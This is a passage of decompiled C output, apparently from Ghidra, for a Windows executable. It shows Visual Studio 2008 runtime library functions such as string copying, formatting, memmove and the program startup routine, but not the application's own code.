    if (uVar4 == 0xffffffff) {
      if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < (ushort)(uVar7 - 0x61))) break;
      if ((ushort)(uVar7 - 0x61) < 0x1a) {
        uVar5 = uVar5 - 0x20;
      }
      uVar4 = uVar5 - 0x37;
    }
    if ((uint)param_4 <= uVar4) break;
    if (((local_c._4_4_ < local_14._4_4_) ||
        ((local_c._4_4_ <= local_14._4_4_ && ((uint)local_c < (uint)local_14)))) ||
       (((uint)local_c == (uint)local_14 &&
        ((local_c._4_4_ == local_14._4_4_ && ((local_18 != 0 || (uVar4 <= local_1c)))))))) {
      local_c = __allmul(local_24,local_20,(uint)local_c,local_c._4_4_);
      local_c = local_c + (ulonglong)uVar4;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (wchar_t **)0x0) break;
    }
    uVar5 = (uint)(ushort)*pwVar6;
    pwVar6 = pwVar6 + 1;
  } while( true );
  pwVar6 = pwVar6 + -1;
  if ((param_5 & 8U) == 0) {
    if (param_3 != (wchar_t **)0x0) {
      pwVar6 = param_2;
    }
    local_c = 0;
  }
  else if (((param_5 & 4U) != 0) ||
          (((param_5 & 1U) == 0 &&
           ((((param_5 & 2U) != 0 &&
             ((0x80000000 < local_c._4_4_ || ((0x7fffffff < local_c._4_4_ && ((uint)local_c != 0))))
             )) || (((param_5 & 2U) == 0 &&
                    ((0x7ffffffe < local_c._4_4_ && (0x7fffffff < local_c._4_4_)))))))))) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    if ((param_5 & 1U) == 0) {
      if ((param_5 & 2U) == 0) {
        local_c = 0x7fffffffffffffff;
      }
      else {
        local_c = -0x8000000000000000;
      }
    }
    else {
      local_c = -1;
    }
  }
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = pwVar6;
  }
  if ((param_5 & 2U) != 0) {
    local_c = CONCAT44(-(local_c._4_4_ + ((uint)local_c != 0)),-(uint)local_c);
  }
  if (local_28 != '\0') {
    *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
  }
  goto LAB_0040bb84;
}



// Library Function - Single Match
//  __wcstoi64
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __wcstoi64(wchar_t *_Str,wchar_t **_EndPtr,int _Radix)

{
  __uint64 _Var1;
  undefined **ppuVar2;
  
  if (DAT_004241c8 == 0) {
    ppuVar2 = &PTR_DAT_00422d98;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  _Var1 = wcstoxq((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return _Var1;
}



// Library Function - Single Match
//  _strcpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        cVar1 = *_Src;
        *pcVar3 = cVar1;
        _Src = _Src + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
        pcVar3 = pcVar3 + 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_0040bbd5;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0040bbd5:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  __vsnprintf_helper
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vsnprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  FILE local_24;
  
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else if ((param_3 == 0) || (param_2 != (char *)0x0)) {
    local_24._cnt = 0x7fffffff;
    if (param_3 < 0x80000000) {
      local_24._cnt = param_3;
    }
    local_24._flag = 0x42;
    local_24._base = param_2;
    local_24._ptr = param_2;
    iVar2 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
    if (param_2 != (char *)0x0) {
      if (-1 < iVar2) {
        local_24._cnt = local_24._cnt - 1;
        if (-1 < local_24._cnt) {
          *local_24._ptr = '\0';
          return iVar2;
        }
        iVar3 = __flsbuf(0,&local_24);
        if (iVar3 != -1) {
          return iVar2;
        }
      }
      param_2[param_3 - 1] = '\0';
      iVar2 = (-1 < local_24._cnt) - 2;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  return iVar2;
}



// Library Function - Single Match
//  __vsprintf_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vsprintf_s_l(char *_DstBuf,size_t _DstSize,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (char *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if ((_DstBuf == (char *)0x0) || (_DstSize == 0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
    }
    else {
      iVar2 = __vsnprintf_helper(__output_s_l,_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList);
      if (iVar2 < 0) {
        *_DstBuf = '\0';
      }
      if (iVar2 != -2) {
        return iVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



// Library Function - Single Match
//  _vsprintf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl _vsprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// Library Function - Single Match
//  __freea
// 
// Library: Visual Studio 2008 Release

void __cdecl __freea(void *_Memory)

{
  if ((_Memory != (void *)0x0) && (*(int *)((int)_Memory + -8) == 0xdddd)) {
    _free((int *)((int)_Memory + -8));
  }
  return;
}



// Library Function - Single Match
//  _wcsncmp
// 
// Library: Visual Studio 2008 Release

int __cdecl _wcsncmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  if (_MaxCount != 0) {
    for (; ((_MaxCount = _MaxCount - 1, _MaxCount != 0 && (*_Str1 != L'\0')) && (*_Str1 == *_Str2));
        _Str1 = _Str1 + 1) {
      _Str2 = _Str2 + 1;
    }
    return (uint)(ushort)*_Str1 - (uint)(ushort)*_Str2;
  }
  return 0;
}



// Library Function - Single Match
//  _strrchr
// 
// Library: Visual Studio 2008 Release

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = _Str;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = _Str + 1;
    cVar1 = *_Str;
    _Str = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while ((char)_Ch != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != (char)_Ch) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



// Library Function - Single Match
//  _sprintf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl _sprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,...)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,&stack0x00000010);
  return iVar1;
}



// Library Function - Single Match
//  _strcat_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strcat_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        if (*pcVar3 == '\0') break;
        pcVar3 = pcVar3 + 1;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        do {
          cVar1 = *_Src;
          *pcVar3 = cVar1;
          pcVar3 = pcVar3 + 1;
          _Src = _Src + 1;
          if (cVar1 == '\0') break;
          _SizeInBytes = _SizeInBytes - 1;
        } while (_SizeInBytes != 0);
        if (_SizeInBytes != 0) {
          return 0;
        }
        *_Dst = '\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_0040be5d;
      }
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0040be5d:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _strcmp
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  undefined2 uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  bool bVar5;
  
  if (((uint)_Str1 & 3) != 0) {
    if (((uint)_Str1 & 1) != 0) {
      bVar4 = *_Str1;
      _Str1 = _Str1 + 1;
      bVar5 = bVar4 < (byte)*_Str2;
      if (bVar4 != *_Str2) goto LAB_0040bef4;
      _Str2 = _Str2 + 1;
      if (bVar4 == 0) {
        return 0;
      }
      if (((uint)_Str1 & 2) == 0) goto LAB_0040bec0;
    }
    uVar1 = *(undefined2 *)_Str1;
    _Str1 = (char *)((int)_Str1 + 2);
    bVar4 = (byte)uVar1;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) goto LAB_0040bef4;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((ushort)uVar1 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) goto LAB_0040bef4;
    if (bVar4 == 0) {
      return 0;
    }
    _Str2 = (char *)((byte *)_Str2 + 2);
  }
LAB_0040bec0:
  while( true ) {
    uVar2 = *(undefined4 *)_Str1;
    bVar4 = (byte)uVar2;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 0x10);
    bVar5 = bVar4 < ((byte *)_Str2)[2];
    if (bVar4 != ((byte *)_Str2)[2]) break;
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    if (bVar4 == 0) {
      return 0;
    }
    bVar5 = bVar3 < ((byte *)_Str2)[3];
    if (bVar3 != ((byte *)_Str2)[3]) break;
    _Str2 = (char *)((byte *)_Str2 + 4);
    _Str1 = (char *)((int)_Str1 + 4);
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_0040bef4:
  return (uint)bVar5 * -2 + 1;
}



// Library Function - Single Match
//  _xtow_s@20
// 
// Library: Visual Studio 2008 Release

int _xtow_s_20(uint param_1,uint param_2,uint param_3,int param_4)

{
  short *psVar1;
  short *in_EAX;
  int *piVar2;
  short *psVar3;
  short *psVar4;
  short sVar5;
  int iVar6;
  uint local_8;
  
  if (in_EAX == (short *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return 0x16;
  }
  if (param_2 == 0) {
LAB_0040bf6c:
    piVar2 = __errno();
    iVar6 = 0x16;
  }
  else {
    *in_EAX = 0;
    if ((param_4 != 0) + 1 < param_2) {
      if (0x22 < param_3 - 2) goto LAB_0040bf6c;
      psVar3 = in_EAX;
      if (param_4 != 0) {
        param_1 = -param_1;
        *in_EAX = 0x2d;
        psVar3 = in_EAX + 1;
      }
      local_8 = (uint)(param_4 != 0);
      psVar1 = psVar3;
      do {
        psVar4 = psVar1;
        sVar5 = (short)(param_1 % param_3);
        if (param_1 % param_3 < 10) {
          sVar5 = sVar5 + 0x30;
        }
        else {
          sVar5 = sVar5 + 0x57;
        }
        *psVar4 = sVar5;
        local_8 = local_8 + 1;
      } while ((param_1 / param_3 != 0) &&
              (psVar1 = psVar4 + 1, param_1 = param_1 / param_3, local_8 < param_2));
      if (local_8 < param_2) {
        psVar4[1] = 0;
        do {
          sVar5 = *psVar4;
          *psVar4 = *psVar3;
          *psVar3 = sVar5;
          psVar4 = psVar4 + -1;
          psVar3 = psVar3 + 1;
        } while (psVar3 < psVar4);
        return 0;
      }
      *in_EAX = 0;
    }
    piVar2 = __errno();
    iVar6 = 0x22;
  }
  *piVar2 = iVar6;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return iVar6;
}



// Library Function - Single Match
//  __itow_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __itow_s(int _Val,wchar_t *_DstBuf,size_t _SizeInWords,int _Radix)

{
  int iVar1;
  
  if ((_Radix == 10) && (_Val < 0)) {
    iVar1 = 1;
    _Radix = 10;
  }
  else {
    iVar1 = 0;
  }
  iVar1 = _xtow_s_20(_Val,_SizeInWords,_Radix,iVar1);
  return iVar1;
}



// Library Function - Single Match
//  _calloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _calloc(size_t _Count,size_t _Size)

{
  int *piVar1;
  int *piVar2;
  int local_8;
  
  local_8 = 0;
  piVar1 = __calloc_impl(_Count,_Size,&local_8);
  if ((piVar1 == (int *)0x0) && (local_8 != 0)) {
    piVar2 = __errno();
    if (piVar2 != (int *)0x0) {
      piVar2 = __errno();
      *piVar2 = local_8;
    }
  }
  return piVar1;
}



// Library Function - Single Match
//  _strcpy
// 
// Library: Visual Studio

char * __cdecl _strcpy(char *_Dest,char *_Source)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  
  uVar3 = (uint)_Source & 3;
  puVar4 = (uint *)_Dest;
  while (uVar3 != 0) {
    bVar1 = *_Source;
    uVar3 = (uint)bVar1;
    _Source = (char *)((int)_Source + 1);
    if (bVar1 == 0) goto LAB_0040c190;
    *(byte *)puVar4 = bVar1;
    puVar4 = (uint *)((int)puVar4 + 1);
    uVar3 = (uint)_Source & 3;
  }
  do {
    uVar2 = *(uint *)_Source;
    uVar3 = *(uint *)_Source;
    _Source = (char *)((int)_Source + 4);
    if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {
      if ((char)uVar3 == '\0') {
LAB_0040c190:
        *(byte *)puVar4 = (byte)uVar3;
        return _Dest;
      }
      if ((char)(uVar3 >> 8) == '\0') {
        *(short *)puVar4 = (short)uVar3;
        return _Dest;
      }
      if ((uVar3 & 0xff0000) == 0) {
        *(short *)puVar4 = (short)uVar3;
        *(byte *)((int)puVar4 + 2) = 0;
        return _Dest;
      }
      if ((uVar3 & 0xff000000) == 0) {
        *puVar4 = uVar3;
        return _Dest;
      }
    }
    *puVar4 = uVar3;
    puVar4 = puVar4 + 1;
  } while( true );
}



// Library Function - Single Match
//  _memcpy_s
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

errno_t __cdecl _memcpy_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  errno_t eVar1;
  int *piVar2;
  
  if (_MaxCount == 0) {
LAB_0040c2d4:
    eVar1 = 0;
  }
  else {
    if (_Dst == (void *)0x0) {
LAB_0040c2dd:
      piVar2 = __errno();
      eVar1 = 0x16;
      *piVar2 = 0x16;
    }
    else {
      if ((_Src != (void *)0x0) && (_MaxCount <= _DstSize)) {
        _memcpy(_Dst,_Src,_MaxCount);
        goto LAB_0040c2d4;
      }
      _memset(_Dst,0,_DstSize);
      if (_Src == (void *)0x0) goto LAB_0040c2dd;
      if (_MaxCount <= _DstSize) {
        return 0x16;
      }
      piVar2 = __errno();
      eVar1 = 0x22;
      *piVar2 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar1;
}



// Library Function - Single Match
//  _memmove
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memmove(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_0040c533_caseD_2;
        case 3:
          goto switchD_0040c533_caseD_3;
        }
        goto switchD_0040c533_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_0040c533_caseD_0;
      case 1:
        goto switchD_0040c533_caseD_1;
      case 2:
        goto switchD_0040c533_caseD_2;
      case 3:
        goto switchD_0040c533_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040c533_caseD_2;
            case 3:
              goto switchD_0040c533_caseD_3;
            }
            goto switchD_0040c533_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040c533_caseD_2;
            case 3:
              goto switchD_0040c533_caseD_3;
            }
            goto switchD_0040c533_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040c533_caseD_2;
            case 3:
              goto switchD_0040c533_caseD_3;
            }
            goto switchD_0040c533_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_0040c533_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_0040c533_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_0040c533_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_0040c533_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_004268c4 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0040c3ac_caseD_2;
      case 3:
        goto switchD_0040c3ac_caseD_3;
      }
      goto switchD_0040c3ac_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_0040c3ac_caseD_0;
    case 1:
      goto switchD_0040c3ac_caseD_1;
    case 2:
      goto switchD_0040c3ac_caseD_2;
    case 3:
      goto switchD_0040c3ac_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040c3ac_caseD_2;
          case 3:
            goto switchD_0040c3ac_caseD_3;
          }
          goto switchD_0040c3ac_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040c3ac_caseD_2;
          case 3:
            goto switchD_0040c3ac_caseD_3;
          }
          goto switchD_0040c3ac_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040c3ac_caseD_2;
          case 3:
            goto switchD_0040c3ac_caseD_3;
          }
          goto switchD_0040c3ac_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0040c3ac_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_0040c3ac_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0040c3ac_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_0040c3ac_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  _fast_error_exit
// 
// Library: Visual Studio 2008 Release

void __cdecl _fast_error_exit(int param_1)

{
  if (DAT_004239b8 == 1) {
    __FF_MSGBANNER();
  }
  __NMSG_WRITE(param_1);
  ___crtExitProcess(0xff);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x0040c745)
// Library Function - Single Match
//  ___tmainCRTStartup
// 
// Library: Visual Studio 2008 Release

int ___tmainCRTStartup(void)

{
  int iVar1;
  wchar_t *pwVar2;
  _STARTUPINFOW local_6c;
  int local_24;
  int local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x40c6ea;
  local_8 = 0;
  GetStartupInfoW(&local_6c);
  local_8 = 0xfffffffe;
  local_20 = 0;
  iVar1 = __heap_init();
  if (iVar1 == 0) {
    _fast_error_exit(0x1c);
  }
  iVar1 = __mtinit();
  if (iVar1 == 0) {
    _fast_error_exit(0x10);
  }
  __RTC_Initialize();
  local_8 = 1;
  iVar1 = __ioinit();
  if (iVar1 < 0) {
    __amsg_exit(0x1b);
  }
  DAT_004268c8 = GetCommandLineW();
  DAT_004239b4 = ___crtGetEnvironmentStringsW();
  iVar1 = __wsetargv();
  if (iVar1 < 0) {
    __amsg_exit(8);
  }
  iVar1 = __wsetenvp();
  if (iVar1 < 0) {
    __amsg_exit(9);
  }
  iVar1 = __cinit(1);
  if (iVar1 != 0) {
    __amsg_exit(iVar1);
  }
  pwVar2 = (wchar_t *)__wwincmdln();
  local_24 = FUN_00401081((HINSTANCE)&IMAGE_DOS_HEADER_00400000,0,pwVar2);
  if (local_20 == 0) {
                    // WARNING: Subroutine does not return
    _exit(local_24);
  }
  __cexit();
  return local_24;
}



void entry(void)

{
  ___security_init_cookie();
  ___tmainCRTStartup();
  return;
}



